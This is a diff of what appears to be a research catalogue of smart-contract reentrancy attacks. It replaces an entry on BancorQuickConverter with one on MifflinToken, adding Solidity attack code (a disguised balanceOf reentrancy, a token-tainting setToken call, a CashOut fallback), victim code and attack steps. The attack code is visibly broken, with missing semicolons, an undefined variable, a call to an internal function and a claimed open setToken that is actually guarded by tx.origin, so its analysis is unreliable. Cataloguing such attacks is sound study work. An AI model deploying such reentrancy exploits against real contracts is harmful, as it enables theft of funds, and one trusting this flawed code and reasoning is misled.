@@ -4,46 +4,53 @@ Attack 06
 
 **Contract Name**
 
-BancorQuickConverter
+MifflinToken
 
 **Contract Address**
 
-0x1a5f170802824e44181b6727e5447950880187ab
+0x1ff6f142ebdce220d8dd85eb31dcb92a47690846
 
 **Transaction Count**
 
-0
+1
 
 **Invovled Ethers**
 
-0 Ethers
+0.1 Ethers
 
 **Length of the Call Chain**
 
-1 external function
+2 external function, 2 internal funciton
 
 **Victim Function**
 
-``convertFor``
+``CashOut``
 
 **Attack Mechanisim**
 
 Attack code:
 ::
 
-    contract Attack is IERC20Token{
-        BancorQuickConverter b = new BancorQuickConverter();
+    contract Attack is MifflinToken {
+        address victim;
+        address market;
         constructor() payable {}
-        IERC20Token[] _path
 
-        function setPath() {
-            _path[0] = Attack(this);
-            _path[1] = Attack(this);
-            _path[2] = Attack(this);
+        function setVictim(address _vic, address _market) {
+            victim = _vic
+            market = _market
         }
 
-        function deposit() public {  
-            b.convertFor.value(10)(_path, 10, 0, this);
+        function prepareAttack() {
+            market.call(bytes4(keccak256("setToken(uint8, address)")), 1, this);
+        }
+
+        function balanceOf(MifflinToken token) public {   // Disguised attack function
+            victim.call.value(1 eth)(bytes4(keccak256("contribution(uint256)")), 10);
+        }
+
+        function() payable{
+            p.CashOut(1 eth);
         }
 
         function getvalue() returns (uint) {
@@ -51,59 +58,65 @@ Attack code:
         }
     }
 
-    contract IERC20Token is IEtherToken {}
-    contrac IEtherToken{}
-
 Attacked code:
 ::
 
-    contract BancorQuickConverter {
+    contract MifflinToken is Owned, TokenERC20 {
         ...
-        modifier validConversionPath() {
-            require(_path.length > 2 && _path.length <= (1 + 2 * 10) && _path.length % 2 == 1);
-            _;
+        function contribution(uint256 amount)internal returns(int highlow){
+            owner.transfer(msg.value);
+            totalContribution += msg.value;
+
+            if (amount > highestContribution) {
+                uint256 oneper = buyPrice * 99 / 100; // lower by 1%*
+                uint256 fullper = buyPrice *  highestContribution / amount; // lower by how much you beat the prior contribution
+                if(fullper > oneper) buyPrice = fullper;
+                else buyPrice = oneper;
+                highestContribution = amount;
+                // give reward
+                MifflinMarket(exchange).highContributionAward(msg.sender);
+                return 1;
+            } else if(amount < lowestContribution){
+                MifflinMarket(exchange).lowContributionAward(msg.sender);
+                lowestContribution = amount;
+                return -1;
+            } else return 0;
         }
 
-        function convertFor(IERC20Token[] _path, uint256 _amount, uint256 _minReturn, address _for)
-            public
-            payable
-            validConversionPath(_path)
-            returns (uint256)
-        {
-            // if ETH is provided, ensure that the amount is identical to _amount and verify that the source token is an ether token
-            IERC20Token fromToken = _path[0];
-            require(msg.value == 0 || (_amount == msg.value && etherTokens[fromToken]));
-
-            ISmartToken smartToken;
-            IERC20Token toToken;
-            ITokenConverter converter;
-            uint256 pathLength = _path.length;
-
-            if (msg.value > 0)
-                IEtherToken(fromToken).deposit.value(msg.value)();
-
-            for (uint256 i = 1; i < pathLength; i += 2) {
-                smartToken = ISmartToken(_path[i]);
-                toToken = _path[i + 1];
-                converter = ITokenConverter(smartToken.owner());
-
-                if (smartToken != fromToken)
-                    ensureAllowance(fromToken, converter, _amount);
-
-                _amount = converter.change(fromToken, toToken, _amount, i == pathLength - 2 ? _minReturn : 1);
-                fromToken = toToken;
-            }
-
-            if (etherTokens[toToken])
-                IEtherToken(toToken).withdrawTo(_for, _amount);
-            else
-                assert(toToken.transfer(_for, _amount));
-
-            return _amount;
-        }
         ...
     }
 
-In this case, the attacker can lauch reentrancy attack by calling ``IEtherToken(fromToken).deposit.value(msg.value)();``. The parameter ``fromToken`` is not carefully checked and can be easily changed by visitors. Visitor can modify the value of ``_path`` by passing an arbitrary parameter. Since ``fromToken`` is assigned by ``_path``, the value of ``fromToken`` is modified after ``_path``.
+    contract MifflinMarket is Owned {
+        ...
+        modifier onlyOwnerOrigin{
+            require(tx.origin == owner);
+            _;
+        }
 
-**Attack.** The attacker call ``setPath`` function to specify the array ``_path``, and call ``deposit`` to start attack.
+        function setToken(uint8 tid,address addy) public onlyOwnerOrigin { // Only add tokens that were created by exchange owner
+            tokenIds[tid] = addy;
+        }
+
+        function getRewardToken() public view returns(MifflinToken){
+            return getTokenById(rewardTokenId);
+        }
+
+        function getTokenById(uint8 id) public view returns(MifflinToken){
+            require(tokenIds[id] > 0);
+            return MifflinToken(tokenIds[id]);
+        }
+
+        function highContributionAward(address to) public onlyTokens {
+            MifflinToken reward = getRewardToken();
+            //dont throw an error if there are no more tokens
+            if(reward.balanceOf(reward) > 0){
+                reward.give(to, 1);
+            }
+        }
+        ...
+    }
+    ...
+
+In this case, the key condition defenses reentrancy attack is ``reward.balanceOf(reward) > 0`` in function ``highContributionAward``. However, ``reward`` can be easily tainted. It inherits value from ``tokenIds[id]``, which can also be easily taited by any access.
+
+**Attack.** The attacker call ``setVictim`` function to specify the address to attack. Then attacker call ``prepareAttack``function to taint variable. Finally attacker call ``balanceOf`` to start attack.
